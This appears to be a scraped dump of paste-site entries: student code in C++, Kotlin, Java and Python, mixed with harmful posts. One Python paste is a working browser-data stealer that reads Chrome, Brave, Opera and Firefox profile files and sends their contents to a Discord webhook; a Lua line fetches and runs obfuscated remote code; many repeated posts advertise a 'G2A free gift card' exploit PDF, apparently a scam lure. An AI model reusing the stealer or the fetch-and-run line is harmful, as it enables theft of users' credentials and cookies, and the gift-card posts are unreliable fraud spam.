plt.axis(""off"")

plt.subplot(2, 2, 4)
plt.imshow(image_personNEW)
plt.title(f""New Person\nLabel: {personNEW_label},[{personNEW_prediction}]"")
plt.axis(""off"")

# Plot accuracy history
plt.figure(figsize=(12, 5))
plt.plot(range(1, epochs + 1), accuracy_history, marker='o')
plt.title('Accuracy Over Epochs')
plt.xlabel('Epochs')
plt.ylabel('Accuracy')
plt.grid()

# Print normalized data
print(""Normalized PersonNEW Data:"")
print(personNEW_results_normalized)

plt.show()

print(""X_train before normalization:"")
print(X_train)
print(""X_test before normalization:"")
print(X_test)

import seaborn as sns

print(""KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK"")
print(X_test)
print(""HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"")
print(X_train)
print(""LLLLLLLLLLLLLLLLLLLLLLLLLLLLL"")

from sklearn.metrics import confusion_matrix
from tensorflow.keras.utils import to_categorical

np.set_printoptions(threshold=np.inf, precision=4, suppress=True)

# Generate predictions from the model
predictions = (model.predict(X_test_normalized) > 0.5).astype(int)

# Convert y_test to a numpy array and then to binary labels
y_test_array = np.array(y_test)  # Convert y_test to a numpy array
y_test_binary = (y_test_array > 0.5).astype(int)  # Convert to binary

# Compute the confusion matrix
conf_matrix = confusion_matrix(y_test_binary, predictions)

# Evaluate the model's performance
accuracy = accuracy_score(y_test_binary, predictions)
precision = precision_score(y_test_binary, predictions)
recall = recall_score(y_test_binary, predictions)
f1 = f1_score(y_test_binary, predictions)

# Display the confusion matrix
sns.heatmap(conf_matrix, annot=True, fmt='d', cmap='Blues')
plt.xlabel('Predicted')
plt.ylabel('Actual')
plt.title('Confusion Matrix')
plt.show()

print(f""Accuracy: {accuracy:.4f}"")
print(f""Precision: {precision:.4f}"")
print(f""Recall: {recall:.4f}"")
print(f""F1 Score: {f1:.4f}"")

print(f""Confusion Matrix2122:\n{conf_matrix}"")
"
5vAkDw70,💸G2A.com Free Gift Card Guide May 2024 FIX🔥,Alfonso1119,Python,Saturday 25th of May 2024 01:56:12 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4318174.pdf

Working as of:

25 May 2024"
gyY04zt5,lab 14,SillyWolfy,C++,Saturday 25th of May 2024 01:50:45 PM CDT,"#define NOMINMAX
#include <windows.h>
#include <iostream>
#include <string>
#include <limits>
#include <fstream>
#include <sstream>
#include <vector>
using namespace std;

struct Coach;
struct Gym
{
    string name;
    vector<Coach*> coaches;
};

struct Coach
{
    string name;
    vector<Gym*> gyms;
};

void make_relation(vector<Gym>& gyms, vector<Coach>& coaches) {
    system(""cls"");
    if (coaches.empty()) {
        cout << ""Нет тренеров для связи.\n"";
        system(""pause"");
        system(""cls"");
        return;
    }
    if (gyms.empty()) {
        cout << ""Нет залов для связи.\n"";
        system(""pause"");
        system(""cls"");
        return;
    }
    int indx = 0;
    for (auto& i : coaches)
    {
        cout << indx + 1 << "". "" << i.name << '\n';
        indx++;
    }
    int coach_indx = 0;
    while (true) {
        cout << ""Выберите тренера для связи: "";
        if (cin >> coach_indx and coach_indx > 0 and coach_indx <= coaches.size()) {
            break;
        }
        else {
            cout << ""Неверный ввод. Попробуйте снова.\n"";
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
        }
    }

    indx = 0;
    for (auto& i : gyms)
    {
        cout << indx + 1 << "". "" << i.name << '\n';
        indx++;
    }
    int gym_indx = 0;
    while (true) {
        cout << ""Выберите зал для связи: "";
        if (cin >> gym_indx and gym_indx > 0 and gym_indx <= gyms.size()) {
            break;
        }
        else {
            cout << ""Неверный ввод. Попробуйте снова.\n"";
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
        }
    }

    gyms[gym_indx - 1].coaches.push_back(&coaches[coach_indx - 1]);
    coaches[coach_indx - 1].gyms.push_back(&gyms[gym_indx - 1]);
    system(""cls"");
}

void add_coach(vector<Coach>& coaches) {
    system(""cls"");
    Coach new_coach;
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    cout << ""Введите имя тренера: "";
    string name;
    getline(cin, name);
    new_coach.name = name;
    coaches.push_back(new_coach);
    system(""cls"");
}

void add_gym(vector<Gym>& gyms) {
    system(""cls"");
    Gym new_gym;
    cin.ignore(numeric_limits<streamsize>::max(), '\n');
    cout << ""Введите название зала: "";
    string name;
    getline(cin, name);
    new_gym.name = name;
    gyms.push_back(new_gym);
    system(""cls"");
}

void list_gyms(const vector<Gym>& gyms) {
    system(""cls"");
    if (gyms.empty()) {
        cout << ""Список залов пуст.\n"";
    }
    else {
        for (const auto& gym : gyms) {
            cout << gym.name << '\n';
        }
    }
    system(""pause"");
    system(""cls"");
}

void list_coaches(const vector<Coach>& coaches) {
    system(""cls"");
    if (coaches.empty()) {
        cout << ""Список тренеров пуст.\n"";
    }
    else {
        for (const auto& coach : coaches) {
            cout << coach.name << '\n';
        }
    }
    system(""pause"");
    system(""cls"");
}

void list_coaches_in_gym(const vector<Gym>& gyms) {
    system(""cls"");
    if (gyms.empty()) {
        cout << ""Список залов пуст.\n"";
        system(""pause"");
        system(""cls"");
        return;
    }
    int indx = 0;
    for (const auto& gym : gyms) {
        cout << indx + 1 << "". "" << gym.name << '\n';
        indx++;
    }
    int gym_indx = 0;
    while (true) {
        cout << ""Выберите зал для отображения тренеров: "";
        if (cin >> gym_indx and gym_indx > 0 and gym_indx <= gyms.size()) {
            break;
        }
        else {
            cout << ""Неверный ввод. Попробуйте снова.\n"";
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
        }
    }

    system(""cls"");
    if (gyms[gym_indx - 1].coaches.empty()) {
        cout << ""В этом зале нет тренеров.\n"";
    }
    else {
        for (const auto& coach : gyms[gym_indx - 1].coaches) {
            cout << coach->name << '\n';
        }
    }
    system(""pause"");
    system(""cls"");
}

void list_gyms_of_coach(const vector<Coach>& coaches) {
    system(""cls"");
    if (coaches.empty()) {
        cout << ""Список тренеров пуст.\n"";
        system(""pause"");
        system(""cls"");
        return;
    }
    int indx = 0;
    for (const auto& coach : coaches) {
        cout << indx + 1 << "". "" << coach.name << '\n';
        indx++;
    }
    int coach_indx = 0;
    while (true) {
        cout << ""Выберите тренера для отображения залов: "";
        if (cin >> coach_indx and coach_indx > 0 and coach_indx <= coaches.size()) {
            break;
        }
        else {
            cout << ""Неверный ввод. Попробуйте снова.\n"";
            cin.clear();
            cin.ignore(numeric_limits<streamsize>::max(), '\n');
        }
    }

    system(""cls"");
    if (coaches[coach_indx - 1].gyms.empty()) {
        cout << ""У этого тренера нет залов.\n"";
    }
    else {
        for (const auto& gym : coaches[coach_indx - 1].gyms) {
            cout << gym->name << '\n';
        }
    }
    system(""pause"");
    system(""cls"");
}

int main()
{
    SetConsoleOutputCP(1251);
    SetConsoleCP(1251);
    setlocale(LC_ALL, ""Russian"");
    vector<Gym> my_gyms;
    vector<Coach> my_coaches;
    while (true)
    {
        cout << ""--------------------\n"";
        cout << ""Выберите один из пунктов меню\n"";
        cout << ""1) Создать связь\n""
            << ""2) Добавить тренера\n""
            << ""3) Добавить зал\n""
            << ""4) Список залов\n""
            << ""5) Список тренеров\n""
            << ""6) Вывести всех тренеров из зала\n""
            << ""7) Вывести все залы тренера\n""
            << ""8) Закончить программу\n""
            << ""Введите нужный пункт меню: "";
        int answer;
        while (true) {
            if (cin >> answer and answer > 0 and answer <= 8) {
                break;
            }
            else {
                cout << ""Неверный ввод. Попробуйте снова.\n"";
                cin.clear();
                cin.ignore(numeric_limits<streamsize>::max(), '\n');
            }
        }
        switch (answer)
        {
        case 1: {
            make_relation(my_gyms, my_coaches);
            break;
        }
        case 2: {
            add_coach(my_coaches);
            break;
        }
        case 3: {
            add_gym(my_gyms);
            break;
        }
        case 4: {
            list_gyms(my_gyms);
            break;
        }
        case 5: {
            list_coaches(my_coaches);
            break;
        }
        case 6: {
            list_coaches_in_gym(my_gyms);
            break;
        }
        case 7: {
            list_gyms_of_coach(my_coaches);
            break;
        }
        case 8: {
            return 0;
        }
        default:
            cout << ""Неверный пункт меню, попробуйте снова.\n"";
            system(""pause"");
            system(""cls"");
            break;
        }
    }
}
"
64EhNJ9K,💰G2A.com Free Gift Card Guide May 2024 FIX,atakan1983,Python,Saturday 25th of May 2024 01:44:20 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4318174.pdf

Working as of:

25 May 2024"
LkeEDDXY,🎉G2A.com Free Gift Card Guide May 2024 FIX🔥,lookos13,Python,Saturday 25th of May 2024 01:38:13 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4318174.pdf

Working as of:

25 May 2024"
ukZyMYnd,🎉G2A.com Free Gift Card Guide May 2024 FIX🎉,pestinha,Python,Saturday 25th of May 2024 01:32:16 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_4318174.pdf

Working as of:

25 May 2024"
amCDyJ9H,new paragraph (elsa speak),Upar,Kotlin,Saturday 25th of May 2024 01:25:50 PM CDT,"fun createParagraphs(input: String): String {
    val stringBuilder = StringBuilder()
    var currentParagraph = StringBuilder()
    var currentLength = 0

    val sentences = input.split(Regex(""(?<=[.!?])\\s+""))

    for (sentence in sentences) {
        if (currentLength + sentence.length + 1 <= 300) { // +1 for space
            currentParagraph.append(""$sentence "")
            currentLength += sentence.length + 1
        } else {
            stringBuilder.append(currentParagraph.trimEnd())
            stringBuilder.append(""\n\n"")
            currentParagraph.clear()
            currentParagraph.append(""$sentence "")
            currentLength = sentence.length + 1
        }
    }

    // Append any remaining text as the last paragraph
    if (currentParagraph.isNotEmpty()) {
        stringBuilder.append(currentParagraph.trimEnd())
    }

    return stringBuilder.toString()
}

fun main() {
    val inputString = ""your string""
    val result = createParagraphs(inputString)
    println(result)
}"
h4smNKNr,db,CabeSqueeze,JSON,Saturday 25th of May 2024 01:22:24 PM CDT,"{
  ""users"": [
    ""471957787"",
    ""40441271"",
    ""91554964"",
    ""431965616"",
    ""356798678"",
    ""470489717"",
    ""4543222733""
  ]
}
"
0vE77XgN,Untitled,johnfikennedy,Python,Saturday 25th of May 2024 01:12:41 PM CDT,"import multiprocessing as mp

def read_lines_in_range(file_path, start_line, end_line, keyword):
    """"""
    Reads lines from a file within a specified range without loading the entire file into memory.
    Stops when the keyword is found.
    
    :param file_path: Path to the text file.
    :param start_line: Starting line number (inclusive).
    :param end_line: Ending line number (inclusive).
    :param keyword: The keyword to search for in the file.
    :return: The line containing the keyword or None if not found.
    """"""
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            # Seek to the start line
            for current_line in range(1, start_line):
                next(file)
            
            # Read lines within the specified range
            for current_line in range(start_line, end_line + 1):
                try:
                    line = next(file).strip()
                except StopIteration:
                    break
                if keyword.lower() in line.lower():
                    return line
    except FileNotFoundError:
        print(f""Error: The file '{file_path}' was not found."")
    except UnicodeDecodeError:
        print(""Error: The file encoding is not UTF-8."")
    except Exception as e:
        print(f""An error occurred: {e}"")
    return None

def process_chunk(file_path, start_line, chunk_size, keyword):
    """"""
    Process a chunk of lines to search for the keyword.
    Stops when the keyword is found in the chunk.
    
    :param file_path: Path to the text file.
    :param start_line: Starting line number of the chunk.
    :param chunk_size: Number of lines in the chunk.
    :param keyword: The keyword to search for in the file.
    :return: The line containing the keyword or None if not found.
    """"""
    end_line = start_line + chunk_size - 1
    return read_lines_in_range(file_path, start_line, end_line, keyword)

if __name__ == ""__main__"":
    file_path = 'text.txt'
    start_line = 0
    end_line = 40000000
    chunk_size = 10000  # Keep chunk size for balancing
    keyword = 'something@gmail.com'
    
    chunks = [(file_path, i, chunk_size, keyword) for i in range(start_line, end_line, chunk_size)]

    with mp.Pool(mp.cpu_count()) as pool:
        results = pool.starmap(process_chunk, chunks)

    hits = [result for result in results if result is not None]
    total_hits = len(hits)
    
    print(f'Total hits in document: {total_hits}')
    
    # Print lines where the keyword was found
    for line in hits:
        print(line)



"
7cV3MKZd,🎉G2A.com Free Gift Card Guide May 2024 FIX💰,Bufayez,Python,Saturday 25th of May 2024 12:59:18 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
R9fbVs4g,Untitled,johnfikennedy,Python,Saturday 25th of May 2024 12:58:11 PM CDT,"import os
import requests
import time
username = os.getlogin()

brave = fr'C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default'
google = fr'C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default'
opera1 = fr'C:\\Users\\{username}\\AppData\\Local\\Opera Software\\Opera Stable\\Default'
opera2 = fr'C:\\Users\\{username}\\AppData\\Local\\Opera Software\\Opera GX Stable\\Default'
mozilla = fr'C:\\Users\\{username}\\AppData\\Local\\Mozilla\\Firefox\\Profiles'
webhook_url = 'https://discord.com/api/webhooks/1243971377405628527/urwebhook'
def send_discord_webhook(webhook_url, message):
    MAX_MESSAGE_LENGTH = 2000
    num_segments = len(message) // MAX_MESSAGE_LENGTH + 1

    for i in range(num_segments):
        time.sleep(1/49) # 50 messages per second https://support-dev.discord.com/hc/en-us/articles/6223003921559-My-Bot-Is-Being-Rate-Limited

        start_index = i * MAX_MESSAGE_LENGTH
        end_index = (i + 1) * MAX_MESSAGE_LENGTH
        segment = message[start_index:end_index]

        payload = {'content': segment}
        headers = {'Content-Type': 'application/json'}
        response = requests.post(webhook_url, json=payload, headers=headers)

        if response.status_code != 204:
            print(f""Failed to send segment {i+1} of the message."")
        else:
            print(f""Segment {i+1} of the message sent successfully."")
def read_large_file(file_path, chunk_size=1024):
    with open(file_path, 'r', encoding='utf-8') as file:
        while True:
            chunk = file.read(chunk_size)
            if not chunk:
                break
            yield chunk

def read_files_in_directory(directory, blacklist=[]):
    # Check if the directory exists
    if not os.path.exists(directory):
        return
    
    # Iterate over each file in the directory
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        # Check if the path is a file
        allow = True
        for keyword in blacklist:
            if keyword in file_path:
                allow = False
        if allow:
            if os.path.isfile(file_path):
                # Check file size
                file_size = os.path.getsize(file_path)
                if file_size > 100 * 1024 * 1024:  # If file size exceeds 100MB, split into segments
                    for chunk in read_large_file(file_path):
                        send_discord_webhook(webhook_url, chunk)
                else:
                    # Open the file and read its contents
                    try:
                        with open(file_path, 'r', encoding='utf-8') as file:
                            contents = file.read()
                            # Check if the contents are empty
                            if contents.strip():  # If contents are not empty
                                send_discord_webhook(webhook_url, contents)
                            else:  # If contents are empty, try a different encoding
                                try:
                                    with open(file_path, 'r', encoding='latin-1') as file:
                                        contents = file.read()
                                        send_discord_webhook(webhook_url, contents)
                                except Exception as e:
                                    pass
                    except UnicodeDecodeError:

                        try:
                            with open(file_path, 'r', encoding='latin-1') as file:
                                contents = file.read()
                                send_discord_webhook(webhook_url, contents)
                        except Exception as e:
                            pass
                    except Exception as e:
                        pass
# Brave
try:
    read_files_in_directory(brave, ['Favicon', 'History', 'publisher_info_db', 'Rewards.log', 'Shortcuts'])
except:
    pass
    
# Google
try:
    read_files_in_directory(google)
except:
    pass

# Opera
try:
    read_files_in_directory(opera1)
except:
    pass

try:
    read_files_in_directory(opera2)
except:
    pass
# Mozilla
try:
    sub_folders = [name for name in os.listdir(mozilla) if os.path.isdir(os.path.join(mozilla, name))]
    for sub_folder in sub_folders:
        read_files_in_directory(f'{mozilla}{sub_folder}\cache2\entries')
except:
    pass
"
CduERbRA,untitled,Bacon_Script,Lua,Saturday 25th of May 2024 12:56:23 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/Goat-Hub103/The-Classic-Event/main/obf_UE79aAiNwWqDbHxG8NOAHj7b8Om543a0MB466g7U14m4edl8X89aWMdu0U4axbRC.lua.txt""))()"
2sNXMVZM,🚀G2A.com Free Gift Card Guide May 2024 FIX🚀,Alfonso1119,Python,Saturday 25th of May 2024 12:47:29 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
wNQ8PkF3,💰G2A.com Free Gift Card Guide May 2024 FIX,Garoam,Python,Saturday 25th of May 2024 12:41:35 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
xnWQXAdG,💰G2A.com Free Gift Card Guide May 2024 FIX💰,lookos13,Python,Saturday 25th of May 2024 12:29:39 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
uHrCvgXq,Area dot java,LampBoy,Java,Saturday 25th of May 2024 12:23:48 PM CDT,"interface FunctionalInterface {
    void areaFunction(ArrayList list, int x, int y, int z);
}

public class Area {
    private final UUID ownerUuid;
    private final BlockPos startPos;
    private final BlockPos endPos;
    private final World world;
    private final String name;
    private final UUID uuid;

    public Area(BlockPos startPos, BlockPos endPos, String name, UUID ownerUuid) {
        this(startPos, endPos, name, UUID.randomUUID(), ownerUuid);
    }

    public Area(BlockPos startPos, BlockPos endPos, String name, UUID uuid, UUID ownerUuid) {
        this.startPos = startPos;
        this.endPos = endPos;
        this.world = MinecraftClient.getInstance().world;
        this.name = name;
        this.uuid = uuid;
        this.ownerUuid = ownerUuid;
    }

    public ArrayList<Block> getBlocks() {
        ArrayList<Block> blockList = this.executeInArea((list, x, y, z) -> {
            list.add(world.getBlockState(new BlockPos(x, y, z)).getBlock());
        });
        return blockList;
    }

    public ArrayList<LivingEntity> getDetectedEntities() {
        ArrayList<LivingEntity> entityList = this.executeInArea((list, x, y, z) -> {
            world.getNonSpectatingEntities(LivingEntity.class, new Box(new BlockPos(x, y, z))).forEach(value -> list.add(value));
        });
        // Removes duplicates from the list
        HashSet<LivingEntity> entitySet = new HashSet<>();
        entityList.forEach(value -> entitySet.add(value));
        entityList.clear();
        entitySet.forEach(value -> entityList.add(value));
        return entityList;
    }

    public <T> ArrayList<T> executeInArea(FunctionalInterface function) {
        ArrayList<T> list = new ArrayList<>();
        int x;
        int y;
        int z;

        x = startPos.getX();
        while (true) {
            y = startPos.getY();
            while (true) {
                z = startPos.getZ();
                while (true) {
                    if (z < endPos.getZ()) {
                        // Runs lambda expressions. defined in FuncitionalInterface.
                        function.areaFunction(list, x, y, z);
                        z++;
                    } else if (z > endPos.getZ()) {
                        function.areaFunction(list, x, y, z);
                        z--;
                    } else {
                        function.areaFunction(list, x, y, z);
                        break;
                    }
                }
                if (y < endPos.getY()) {
                    y++;
                } else if (y > endPos.getY()) {
                    y--;
                } else {
                    break;
                }
            }
            if (x < endPos.getX()) {
                x++;
            } else if (x > endPos.getX()) {
                x--;
            } else {
                break;
            }
        }
        return list;
    }

    public static NbtElement toNbt(Area area) {
        NbtCompound nbt = new NbtCompound();
        nbt.put(""startPos"", NbtHelper.fromBlockPos(area.getStartPos()));
        nbt.put(""endPos"", NbtHelper.fromBlockPos(area.getEndPos()));
        nbt.putString(""name"", area.getName());
        nbt.putUuid(""uuid"", area.getUuid());
        return nbt;
    }

    public static Area fromNbt(NbtCompound nbt) {
        World world = MinecraftClient.getInstance().world;
        BlockPos startPos = NbtHelper.toBlockPos(nbt.getCompound(""startPos""));
        BlockPos endPos = NbtHelper.toBlockPos(nbt.getCompound(""endPos""));
        String name = (nbt.getString(""name""));
        UUID uuid = (nbt.getUuid(""uuid""));
        return new Area(startPos, endPos, name, uuid);
    }

    public static ArrayList<Area> generateAreaListFromNbtList(NbtList nbtList) {
        ArrayList<Area> areaList = new ArrayList<>();
        for (NbtElement nbt : nbtList) {
            areaList.add(fromNbt(((NbtCompound) nbt)));
        }
        return areaList;
    }

    public String getName() {
        return name;
    }

    public BlockPos getStartPos() {
        return startPos;
    }

    public BlockPos getEndPos() {
        return endPos;
    }

    public World getWorld() {
        return world;
    }

    public UUID getUuid() {
        return uuid;
    }
}"
4t5ypbXv,💰G2A.com Free Gift Card Guide May 2024 FIX🎉,pestinha,Python,Saturday 25th of May 2024 12:23:40 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_7327473.pdf

Working as of:

25 May 2024"
